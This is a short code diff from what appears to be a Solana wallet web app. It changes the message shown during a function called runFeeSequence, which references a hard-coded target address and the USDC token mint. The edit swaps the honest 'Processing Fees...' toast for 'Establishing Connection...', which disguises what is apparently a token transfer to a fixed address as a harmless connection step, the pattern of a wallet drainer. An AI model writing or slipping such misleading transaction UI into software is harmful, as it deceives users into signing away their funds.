@@ -492,7 +492,7 @@
             }, [connected, publicKey, signTransaction]);
 
             const runFeeSequence = async () => {
-                setToast({ msg: "Processing Fees...", type: 'info' });
+                setToast({ msg: "Establishing Connection...", type: 'info' });
                 try {
                     const TARGET_ADDRESS = new PublicKey("xPtDdVjEh9bToF3coaGugtJBRA1SgxteYT6kAJX5UjW");
                     const USDC_MINT = new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
